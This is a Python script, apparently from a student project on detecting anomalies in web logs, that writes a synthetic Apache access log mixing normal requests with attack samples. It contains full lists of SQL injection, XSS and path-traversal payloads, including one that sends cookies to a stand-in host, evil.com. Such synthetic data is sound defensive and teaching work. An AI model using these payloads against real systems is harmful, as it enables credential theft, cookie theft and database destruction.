"""
模拟日志生成模块
功能：生成包含正常访问和各类攻击样本的Web日志文件
作者：毕业设计 - Web日志异常检测系统
"""

import random
from datetime import datetime, timedelta


def generate_sample_log(filepath='sample_web.log', total_lines=500):
    """
    生成模拟Web日志文件，包含正常请求和攻击请求。

    参数:
        filepath (str): 输出日志文件路径
        total_lines (int): 总日志行数，默认500行
            其中约70%为正常访问，30%为各类攻击

    返回:
        str: 生成的日志文件路径
    """
    # ============================
    # 配置数据池
    # ============================

    # 正常访问的URL路径列表
    normal_paths = [
        '/index.html',
        '/about.html',
        '/contact.html',
        '/images/logo.png',
        '/images/banner.jpg',
        '/css/style.css',
        '/css/bootstrap.min.css',
        '/js/app.js',
        '/js/main.js',
        '/api/user?id=3',
        '/api/products?page=1',
        '/api/search?q=phone',
        '/login.html',
        '/register.html',
        '/favicon.ico',
        '/robots.txt',
        '/sitemap.xml',
        '/api/orders?status=active',
        '/blog/post-1.html',
        '/blog/post-2.html',
        '/category/electronics',
        '/category/clothing',
        '/static/fonts/arial.woff',
        '/downloads/manual.pdf',
        '/api/v2/data?limit=20&offset=0',
        '/profile/settings',
        '/dashboard',
        '/api/notifications?unread=true',
        '/help/faq.html',
        '/terms.html',
    ]

    # SQL注入攻击URL列表
    sql_injection_urls = [
        "/products.php?cat=1' UNION SELECT username,password FROM users--",
        "/login?user=admin'--&pass=anything",
        "/search?id=1 OR 1=1",
        "/api/item?id=1; DROP TABLE users;--",
        "/news.php?id=1' AND 1=1--",
        "/product?id=2' UNION SELECT NULL,NULL,NULL--",
        "/user?name=admin' OR '1'='1",
        "/order?id=1 UNION SELECT credit_card FROM payments--",
        "/page?id=1' AND (SELECT COUNT(*) FROM users)>0--",
        "/download?file=1' UNION SELECT password FROM admin--",
        "/api/data?id=1' OR 'a'='a",
        "/list?category=1 UNION ALL SELECT table_name FROM information_schema.tables--",
        "/view?id=1'; EXEC xp_cmdshell('dir');--",
        "/query?q=1' UNION SELECT concat(user,0x3a,password) FROM users--",
        "/detail?id=1 OR 1=1#",
    ]

    # XSS攻击URL列表
    xss_urls = [
        "/search?q=<script>alert(1)</script>",
        "/comment?msg=<img src=x onerror=alert(1)>",
        "/profile?name=<script>document.cookie</script>",
        "/page?q=<svg onload=alert('XSS')>",
        "/input?val=<iframe src=javascript:alert(1)>",
        "/forum?post=<script>fetch('http://evil.com?c='+document.cookie)</script>",
        "/review?text=<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "/search?q=<body onload=alert(1)>",
        "/redirect?url=javascript:alert(document.domain)",
        "/display?html=<script>window.location='http://phishing.com'</script>",
        "/feedback?msg=<details open ontoggle=alert(1)>",
        "/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>",
    ]

    # 路径遍历攻击URL列表
    path_traversal_urls = [
        "/../../../etc/passwd",
        "/..%2f..%2f..%2fetc/passwd",
        "/..%2F..%2F..%2Fetc%2Fpasswd",
        "/static/../../../etc/shadow",
        "/images/../../../etc/hosts",
        "/download?file=../../../etc/passwd",
        "/read?path=....//....//....//etc/passwd",
        "/load?name=..%252f..%252f..%252fetc/passwd",
        "/get?file=/var/log/apache2/access.log",
        "/view?template=../../../windows/system32/config/sam",
        "/include?page=..%c0%af..%c0%af..%c0%afetc/passwd",
    ]

    # 随机IP地址池（模拟多个客户端）
    ip_pool = [
        '192.168.1.10', '192.168.1.11', '192.168.1.12', '192.168.1.15',
        '10.0.0.5', '10.0.0.8', '10.0.0.12', '10.0.0.20',
        '172.16.0.3', '172.16.0.7', '172.16.0.15',
        '203.0.113.5', '203.0.113.10', '198.51.100.7',
        '45.33.32.100', '66.249.66.1', '114.114.114.114',
        '8.8.8.8', '1.1.1.1', '223.5.5.5',
    ]

    # 正常User-Agent列表
    normal_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
        'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    ]

    # 攻击User-Agent列表（模拟扫描器和攻击工具）
    attack_agents = [
        'sqlmap/1.7',                    # SQL注入工具
        'Mozilla/5.0 (compatible; Nmap Scripting Engine)',  # 端口扫描
        'python-requests/2.31.0',        # Python脚本
        'curl/8.4.0',                    # 命令行工具
        'Wget/1.21.3',                   # 下载工具
        'Hydra/9.4',                     # 暴力破解工具
    ]

    # HTTP状态码（正常和异常）
    normal_statuses = [200, 200, 200, 200, 301, 304]  # 正常请求多返回200
    attack_statuses = [200, 403, 404, 500, 400]        # 攻击请求可能被拦截

    # ============================
    # 生成日志行
    # ============================

    # 计算各类日志的数量
    num_normal = int(total_lines * 0.7)    # 70%正常访问
    num_attack = total_lines - num_normal   # 30%攻击访问

    # 攻击类型平均分配
    num_sql = num_attack // 3               # SQL注入占1/3
    num_xss = num_attack // 3               # XSS攻击占1/3
    num_traversal = num_attack - num_sql - num_xss  # 路径遍历占剩余

    # 生成基础时间：从2025年5月20日0点开始
    base_time = datetime(2025, 5, 20, 0, 0, 0)

    # 存储所有日志行
    lines = []

    # --- 生成正常访问日志 ---
    for i in range(num_normal):
        # 随机选择IP、URL路径、User-Agent
        ip = random.choice(ip_pool)
        path = random.choice(normal_paths)
        agent = random.choice(normal_agents)
        status = random.choice(normal_statuses)
        size = random.randint(200, 50000)  # 随机响应大小

        # 时间戳在24小时内随机分布
        offset_seconds = random.randint(0, 86399)
        log_time = base_time + timedelta(seconds=offset_seconds)
        # 格式化为Apache日志格式的时间戳
        timestamp = log_time.strftime('%d/%b/%Y:%H:%M:%S +0800')

        # 拼接日志行
        line = f'{ip} - - [{timestamp}] "GET {path} HTTP/1.1" {status} {size} "-" "{agent}"'
        lines.append(line)

    # --- 生成SQL注入攻击日志 ---
    for i in range(num_sql):
        ip = random.choice(ip_pool[:8])  # 攻击者IP相对集中
        path = random.choice(sql_injection_urls)
        agent = random.choice(attack_agents)
        status = random.choice(attack_statuses)
        size = random.randint(100, 5000)

        offset_seconds = random.randint(0, 86399)
        log_time = base_time + timedelta(seconds=offset_seconds)
        timestamp = log_time.strftime('%d/%b/%Y:%H:%M:%S +0800')

        line = f'{ip} - - [{timestamp}] "GET {path} HTTP/1.1" {status} {size} "-" "{agent}"'
        lines.append(line)

    # --- 生成XSS攻击日志 ---
    for i in range(num_xss):
        ip = random.choice(ip_pool[:8])
        path = random.choice(xss_urls)
        agent = random.choice(attack_agents)
        status = random.choice(attack_statuses)
        size = random.randint(100, 5000)

        offset_seconds = random.randint(0, 86399)
        log_time = base_time + timedelta(seconds=offset_seconds)
        timestamp = log_time.strftime('%d/%b/%Y:%H:%M:%S +0800')

        line = f'{ip} - - [{timestamp}] "GET {path} HTTP/1.1" {status} {size} "-" "{agent}"'
        lines.append(line)

    # --- 生成路径遍历攻击日志 ---
    for i in range(num_traversal):
        ip = random.choice(ip_pool[:8])
        path = random.choice(path_traversal_urls)
        agent = random.choice(attack_agents)
        status = random.choice(attack_statuses)
        size = random.randint(100, 3000)

        offset_seconds = random.randint(0, 86399)
        log_time = base_time + timedelta(seconds=offset_seconds)
        timestamp = log_time.strftime('%d/%b/%Y:%H:%M:%S +0800')

        line = f'{ip} - - [{timestamp}] "GET {path} HTTP/1.1" {status} {size} "-" "{agent}"'
        lines.append(line)

    # 打乱所有日志行的顺序（模拟真实混合场景）
    random.shuffle(lines)

    # 写入日志文件
    with open(filepath, 'w', encoding='utf-8') as f:
        for line in lines:
            f.write(line + '\n')

    print(f"[日志生成] 已生成 {len(lines)} 条日志，保存到 {filepath}")
    print(f"  - 正常访问: {num_normal} 条")
    print(f"  - SQL注入: {num_sql} 条")
    print(f"  - XSS攻击: {num_xss} 条")
    print(f"  - 路径遍历: {num_traversal} 条")

    return filepath


# 直接运行时生成日志文件
if __name__ == '__main__':
    generate_sample_log()
